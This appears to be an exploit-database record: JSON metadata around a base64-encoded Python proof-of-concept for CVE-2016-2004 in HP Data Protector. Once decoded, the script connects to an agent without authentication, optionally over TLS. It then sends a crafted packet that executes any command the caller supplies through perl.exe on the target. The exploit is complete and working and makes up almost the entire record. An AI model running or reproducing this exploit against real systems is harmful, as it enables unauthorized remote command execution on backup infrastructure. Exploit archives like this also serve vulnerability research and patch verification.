{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMNCiMgRXhwbG9pdCBUaXRsZTogRGF0YSBQcm90ZWN0b3IgRW5jcnlwdGVkIENvbW11bmljYXRpb25zDQojIERhdGU6IDI2LTA1LTIwMTYNCiMgRXhwbG9pdCBBdXRob3I6IElhbiBMb3ZlcmluZw0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3c4LmhwLmNvbS91ay9lbi9zb2Z0d2FyZS1zb2x1dGlvbnMvZGF0YS1wcm90ZWN0b3ItYmFja3VwLXJlY292ZXJ5LXNvZnR3YXJlLw0KIyBWZXJzaW9uOiBBLjA5LjAwIGFuZCBlYXJsaWVyDQojIFRlc3RlZCBvbjogV2luZG93cyBTZXJ2ZXIgMjAwOA0KIyBDVkUgOiBDVkUtMjAxNi0yMDA0DQojDQoNCiMgICBUaGlzIHByb29mIG9mIGNvbmNlcHQgZGVtb25zdHJhdGVzIHRoYXQgZW5hYmxpbmcgZW5jcnlwdGVkIGNvbnRyb2wgY29tbXVuaWNhdGlvbiBvbg0KIyAgIERhdGEgUHJvdGVjdG9yIGFnZW50cyBkb2VzIG5vdCBwcm92aWRlIGFueSBhZGRpdGlvbmFsIHNlY3VyaXR5Lg0KIyAgIEFzIGlzIHByb3ZpZGVzIG5vIGF1dGhlbnRpY2F0aW9uIGl0IGlzIG5vdCBhIHZpYWJsZSB3b3JrYXJvdW5kIHRvIHByZXZlbnQgdGhlDQojICAgZXhwbG9pdGF0aW9uIG9mIHdlbGwga25vd24gRGF0YSBQcm90ZWN0b3IgaXNzdWVzIHN1Y2ggYXMgY3ZlLTIwMTQtMjYyMw0KIw0KIyAgIFRoaXMgZXhwbG9pdCBlc3RhYmxpc2hlcyBhbmQgdW5hdXRoZW50aWNhdGVkIGVuY3J5cHRlZCBjb21tdW5pY2F0aW9uIGNoYW5uZWwgdG8gDQojICAgYSBEYXRhIFByb3RlY3RvciBBZ2VudCBhbmQgdXNlcyBhIHdlbGwga25vd24gdW5lbmNyeXB0ZWQgRGF0YSBQcm90ZWN0b3IgdnVsbmVyYWJpbGl0eQ0KIyAgIHRvIHJ1biBhcmJpdHJhcnkgY29tbWFuZHMgb24gdGhlIHRhcmdldC4NCg0KIyAgIFRlc3RlZCBvbiBLYWxpIExpbnV4IDIgd2l0aCBweXRob24gMi43LjkNCiMgICBUZXN0ZWQgYWdhaW5zdCBEYXRhIFByb3RlY3RvciBBLjA5LjAwIChJbnRlcm5hbCBCdWlsZCB2ZXJzaW9uIDg4KSB3aXRoIGVuY3J5cHRlZCBjb250cm9sDQojICAgY29tbXVuaWNhdGlvbiBlbmFibGVkLg0KIyAgIEFsbCBvdGhlciBEYXRhIFByb3RlY3RvciBzZXR0aW5ncyBhcmUgZGVmYXVsdC4NCiMgICBUZXN0ZWQgYWdhaW5zdCBEYXRhIFByb3RlY3RvciBhZ2VudCBydW5uaW5nIG9uIFdpbmRvd3MgMjAwOCBSMg0KIyAgIEFsc28gdGVzdGVkIGFnYWluc3QgRGF0YSBQcm90ZWN0b3IgQS4wNw0KIw0KIyAgIGVuY3J5cHRlZC1kYXRhcHJvdGVjdG9yLnB5IC1lIDxpcGFkZHJlc3M+DQojDQojICAgQnkgZGVmYXVsdCBydW5zIGlwY29uZmlnIG9uIHRoZSB0YXJnZXQuIA0KIyAgIENhbiB0YWtlIGEgbGl0dGxlIHdoaWxlIHRvIHJldHVybi4gSGF2ZSBwYXRpZW5jZSA7KQ0KIw0KIyAgIENWRS0yMDE2LTIwMDQNCg0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHNzbA0KaW1wb3J0IHRpbWUNCmltcG9ydCBzdHJ1Y3QNCmltcG9ydCBhcmdwYXJzZQ0KDQoNCnBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKHByb2c9J3Rlc3QtZW5jcnlwdC5weScpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctZScsICctLWVuY3J5cHQnLCBkZXN0PSdlbmNyeXB0JywgYWN0aW9uPSdzdG9yZV90cnVlJykNCnBhcnNlci5hZGRfYXJndW1lbnQoJy1wJywgJy0tcG9ydCcsIHR5cGU9aW50KQ0KcGFyc2VyLmFkZF9hcmd1bWVudCgnLWMnLCAnLS1jb21tYW5kJykNCnBhcnNlci5hZGRfYXJndW1lbnQoJ2lwYWRkcmVzcycpDQpwYXJzZXIuc2V0X2RlZmF1bHRzKGVuY3J5cHQ9RmFsc2UscG9ydD01NTU1KQ0KYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCg0KSE9TVCA9IGFyZ3MuaXBhZGRyZXNzDQpQT1JUID0gYXJncy5wb3J0DQoNCmNvbW1hbmQgPSAnaXBjb25maWcnDQoNCmlmIGFyZ3MuY29tbWFuZDoNCiAgICBjb21tYW5kID0gYXJncy5jb21tYW5kDQoNCiMgaW5pdGlhbGlzZSBkYXRhDQppbml0ZGF0YSA9ICgiXHgwMFx4MDBceDAwXHg0OFx4ZmZceGZlXHgzMlx4MDBceDM2XHgwMFx4MzdceDAwXHgwMFx4MDBceDIwXHgwMCINCiAgICAgICAgIlx4MzFceDAwXHgzMFx4MDBceDAwXHgwMFx4MjBceDAwXHgzMVx4MDBceDMwXHgwMFx4MzBceDAwXHgwMFx4MDAiDQogICAgICAgICJceDIwXHgwMFx4MzlceDAwXHgzMFx4MDBceDMwXHgwMFx4MDBceDAwXHgyMFx4MDBceDM4XHgwMFx4MzhceDAwIg0KICAgICAgICAiXHgwMFx4MDBceDIwXHgwMFx4NmZceDAwXHg2ZFx4MDBceDZlXHgwMFx4NjlceDAwXHg2NFx4MDBceDZjXHgwMCINCiAgICAgICAgIlx4NjNceDAwXHgwMFx4MDBceDIwXHgwMFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMCIpDQoNCk9GRlNFVCA9IDQ2DQpjb21tYW5kID0gY29tbWFuZC5yZXBsYWNlKCJcXCIsICJcXFxcIikNCmNvbW1hbmQgPSBjb21tYW5kLnJlcGxhY2UoIlwnIiwgIlxcXCciKQ0KY29tbWFuZF9sZW5ndGggPSBzdHJ1Y3QucGFjaygiPkkiLE9GRlNFVCArIGxlbihjb21tYW5kKSkNCnBheWxvYWQgPSBjb21tYW5kX2xlbmd0aCAgICAgICAgICtcDQogICAgIlx4MzJceDAwXHgwMVx4MDFceDAxXHgwMVx4MDFceDAxIiArXA0KICAgICJceDAwXHgwMVx4MDBceDAxXHgwMFx4MDFceDAwXHgwMSIgK1wNCiAgICAiXHgwMVx4MDBceDIwXHgzMlx4MzhceDAwXHg1Y1x4NzAiICtcDQogICAgIlx4NjVceDcyXHg2Y1x4MmVceDY1XHg3OFx4NjVceDAwIiArXA0KICAgICJceDIwXHgyZFx4NjVceDczXHg3OVx4NzNceDc0XHg2NSIgK1wNCiAgICAiXHg2ZCgnJXMnKVx4MDAiICUgY29tbWFuZA0KDQpkZWYgZ2V0X2RhdGEoc29jayk6DQogICAgcmVzcG9uc2UgPSAnJw0KICAgIHJlY3ZfbGVuID0xDQogICAgDQogICAgd2hpbGUgcmVjdl9sZW46DQogICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcmVjdl9sZW4gPSBsZW4oZGF0YSkNCiAgICAgICAgcmVzcG9uc2UgKz0gZGF0YQ0KICAgICAgICBpZiByZWN2X2xlbiA8IDQwOTY6DQogICAgICAgICAgICBicmVhaw0KICAgIA0KICAgIHJldHVybiByZXNwb25zZQ0KDQpkZWYgZ2V0X2RwX3Jlc3BvbnNlKHNvY2spOg0KDQogICAgcHJpbnQgIj09PT09IFJlc3BvbnNlID09PT09Ig0KICAgIHByaW50DQoNCiAgICB3aGlsZSBUcnVlOg0KDQogICAgICAgICMgR2V0IGluZm9ybWF0aW9uIGFib3V0IHJlc3BvbnNlDQogICAgICAgIHBhY2tlZF9sZW5ndGggPSBzb2NrLnJlY3YoNCkNCiAgICAgICAgaWYgbm90IHBhY2tlZF9sZW5ndGg6IA0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgbiA9IHN0cnVjdC51bnBhY2soIj5JIiwgcGFja2VkX2xlbmd0aClbMF0NCiAgICAgICAgdG1wcmVzcG9uc2UgPSBzb2NrLnJlY3YobikNCiAgICAgICAgdG1wcmVzcG9uc2UgPSB0bXByZXNwb25zZS5yZXBsYWNlKCJcbiIsICIiKQ0KICAgICAgICB0bXByZXNwb25zZSA9IHRtcHJlc3BvbnNlLnJlcGxhY2UoIlx4MDAiLCAiIikNCiAgICAgICAgdG1wcmVzcG9uc2UgPSB0bXByZXNwb25zZS5yZXBsYWNlKCJceGZmXHhmZVx4MzlceDIwIiwgIiIpDQogICAgICAgIGlmIHRtcHJlc3BvbnNlLnVwcGVyKCkuZmluZCgiKlJFVFZBTCoiKSAhPSAtMToNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCB0bXByZXNwb25zZQ0KDQogICAgcHJpbnQNCiAgICBwcmludCAiPT09PT0gRW5kID09PT09Ig0KICAgIHByaW50DQoNCg0KY2xpZW50ID0gc29ja2V0LnNvY2tldCggc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSApDQoNCmlmIGFyZ3MuZW5jcnlwdDoNCiAgICBjb250ZXh0ID0gc3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKQ0KICAgIGNvbnRleHQuY2hlY2tfaG9zdG5hbWUgPSBGYWxzZQ0KICAgIGNvbnRleHQudmVyaWZ5X21vZGUgPSBzc2wuQ0VSVF9OT05FDQogICAgY29udGV4dC5zZXRfY2lwaGVycygnQUxMJykNCg0KdHJ5Og0KICAgIGNsaWVudC5jb25uZWN0KCggSE9TVCwgUE9SVCApKQ0KICAgIHByaW50ICJDb25uZWN0ZWQiIA0KDQogICAgaWYgYXJncy5lbmNyeXB0Og0KICAgICAgICAjIHNlbmQgZGF0YSBwcm90ZWN0b3IgaW5pdCBzdHJpbmcNCiAgICAgICAgY2xpZW50LnNlbmQoaW5pdGRhdGEpDQogICAgICAgIHJlc3BvbnNlID0gZ2V0X2RhdGEoY2xpZW50KQ0KDQogICAgICAgICMgc2V0dXAgdGxzDQogICAgICAgIGNsaWVudCA9IGNvbnRleHQud3JhcF9zb2NrZXQoY2xpZW50KQ0KICAgICAgICBwcmludCAiRW5jcnlwdGlvbiBFbmFibGVkIg0KICAgIA0KICAgICMgc2VuZCBwYXlsb2FkDQogICAgY2xpZW50LnNlbmQocGF5bG9hZCkNCiAgICBwcmludCAiU2VudCBQYXlsb2FkIg0KICAgIHByaW50ICIiDQogICAgcHJpbnQgIj09PT09IENvbW1hbmQgPT09PT0iDQogICAgcHJpbnQNCiAgICBwcmludCBjb21tYW5kDQogICAgcHJpbnQNCiAgICBnZXRfZHBfcmVzcG9uc2UoY2xpZW50KQ0KDQogICAgY2xpZW50LmNsb3NlKCkNCg0KZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgIHByaW50ICdbKl0gRXhjZXB0aW9uLiBFeGl0aW5nLicNCiAgICBwcmludCBlDQogICAgY2xpZW50LmNsb3NlKCk=", 
    "filename": "platforms/windows/remote/39858.py", 
    "id": "39858", 
    "cves": [
        "CVE-2016-2004"
    ]
}